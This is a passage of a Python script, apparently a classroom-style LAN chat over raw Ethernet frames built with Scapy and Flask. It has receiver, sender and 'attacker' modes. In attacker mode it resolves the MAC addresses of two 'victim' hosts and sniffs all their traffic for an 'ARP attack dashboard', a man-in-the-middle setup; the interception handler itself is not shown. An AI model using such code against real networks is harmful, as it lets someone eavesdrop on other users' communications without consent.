    if packet.haslayer(Ether) and packet[Ether].type == ETHER_TYPE:
        if packet.haslayer(Raw):
            try:
                data = packet[Raw].load.decode()
                
                # Handle encrypted messages
                if data.startswith("ARPCHAT_ENC|"):
                    parts = data.split("|", 2)
                    if len(parts) >= 3:
                        sender_ip = parts[1]
                        encrypted_text = parts[2]
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        
                        # Decrypt the message
                        decrypted_text = decrypt_message(encrypted_text)
                        
                        msg = {
                            'id': len(chat_state['messages']) + 1,
                            'type': 'received',
                            'text': decrypted_text,
                            'sender_ip': sender_ip,
                            'time': timestamp,
                            'encrypted': True
                        }
                        chat_state['messages'].append(msg)
                        print(f"[{timestamp}] 🔒 FROM {sender_ip}: {decrypted_text}")
                
                elif data.startswith("ARPCHAT|"):
                    parts = data.split("|", 2)
                    if len(parts) >= 3:
                        sender_ip = parts[1]
                        message_text = parts[2]
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        
                        msg = {
                            'id': len(chat_state['messages']) + 1,
                            'type': 'received',
                            'text': message_text,
                            'sender_ip': sender_ip,
                            'time': timestamp,
                            'encrypted': False
                        }
                        chat_state['messages'].append(msg)
                        print(f"[{timestamp}] FROM {sender_ip}: {message_text}")
            except Exception as e:
                print(f"Error processing packet: {e}")


def start_sniffer(interface):
    """Start the packet sniffer in a background thread."""
    print(f"Starting packet sniffer on {interface}...")
    try:
        sniff(
            iface=interface,
            prn=packet_handler,
            filter=f"ether proto {hex(ETHER_TYPE)}",
            store=False
        )
    except Exception as e:
        print(f"Sniffer error: {e}")


def main():
    parser = argparse.ArgumentParser(description="Web-based ARP Chat")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-t", "--target", help="Target IP address (required for sender)")
    parser.add_argument("-v", "--victim1", help="First victim IP (required for attacker)")
    parser.add_argument("-g", "--victim2", help="Second victim IP (required for attacker)")
    parser.add_argument("--mode", choices=['sender', 'receiver', 'attacker'], default='receiver',
                        help="Chat mode: sender, receiver, or attacker")
    parser.add_argument("-p", "--port", type=int, help="Web server port (default: receiver=5000, sender=5001, attacker=5002)")
    args = parser.parse_args()
    
    # Set default port based on mode
    if args.port:
        port = args.port
    else:
        port = {'receiver': 5000, 'sender': 5001, 'attacker': 5002}[args.mode]
    
    # Set mode
    chat_state['mode'] = args.mode
    chat_state['interface'] = args.interface
    
    # Get interface info
    info = get_interface_info(args.interface)
    if info:
        chat_state['our_ip'] = info.ip or '0.0.0.0'
        chat_state['our_mac'] = info.mac or '00:00:00:00:00:00'
    
    # For sender mode, resolve target MAC
    if args.mode == 'sender':
        if not args.target:
            print("ERROR: Target IP (-t) is required for sender mode")
            sys.exit(1)
        
        chat_state['target_ip'] = args.target
        print(f"Resolving MAC for {args.target}...")
        
        target_mac = resolve_mac(args.target, args.interface)
        if not target_mac:
            print(f"ERROR: Cannot resolve MAC for {args.target}")
            print("Make sure the target is reachable (try ping first)")
            sys.exit(1)
        
        chat_state['target_mac'] = target_mac
        print(f"Target MAC: {target_mac}")
    
    # For attacker mode, resolve both victim MACs
    if args.mode == 'attacker':
        if not args.victim1 or not args.victim2:
            print("ERROR: Both victim IPs (-v and -g) are required for attacker mode")
            sys.exit(1)
        
        chat_state['victim1_ip'] = args.victim1
        chat_state['victim2_ip'] = args.victim2
        
        print(f"Resolving MAC for victim 1 ({args.victim1})...")
        chat_state['victim1_mac'] = resolve_mac(args.victim1, args.interface)
        if not chat_state['victim1_mac']:
            print(f"ERROR: Cannot resolve MAC for {args.victim1}")
            sys.exit(1)
        print(f"Victim 1 MAC: {chat_state['victim1_mac']}")
        
        print(f"Resolving MAC for victim 2 ({args.victim2})...")
        chat_state['victim2_mac'] = resolve_mac(args.victim2, args.interface)
        if not chat_state['victim2_mac']:
            print(f"ERROR: Cannot resolve MAC for {args.victim2}")
            sys.exit(1)
        print(f"Victim 2 MAC: {chat_state['victim2_mac']}")
        
        # Start sniffer for attacker mode
        sniffer_thread = threading.Thread(
            target=lambda: sniff(iface=args.interface, prn=attacker_packet_handler, store=False),
            daemon=True
        )
        sniffer_thread.start()
    
    # Start sniffer thread for receiver mode
    if args.mode == 'receiver':
        sniffer_thread = threading.Thread(target=start_sniffer, args=(args.interface,), daemon=True)
        sniffer_thread.start()
    
    # Print startup info
    print(f"\n{'='*60}")
    if args.mode == 'attacker':
        print(f"  👹 ARP ATTACK DASHBOARD")
        print(f"{'='*60}")
        print(f"  Interface: {args.interface}")
        print(f"  Our IP:    {chat_state['our_ip']}")
        print(f"  Our MAC:   {chat_state['our_mac']}")
        print(f"  Victim 1:  {chat_state['victim1_ip']} ({chat_state['victim1_mac']})")
        print(f"  Victim 2:  {chat_state['victim2_ip']} ({chat_state['victim2_mac']})")
    else:
        print(f"  ARP CHAT WEB INTERFACE - {args.mode.upper()}")
        print(f"{'='*60}")
        print(f"  Interface: {args.interface}")
        print(f"  Our IP:    {chat_state['our_ip']}")
        print(f"  Our MAC:   {chat_state['our_mac']}")
        if args.mode == 'sender':
            print(f"  Target IP: {chat_state['target_ip']}")
            print(f"  Target MAC: {chat_state['target_mac']}")
    print(f"{'='*60}")
    print(f"\n  🌐 Open your browser to: http://localhost:{port}")
    print(f"\n  Press Ctrl+C to exit\n")
    
    # Start Flask server
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)


if __name__ == "__main__":
    main()
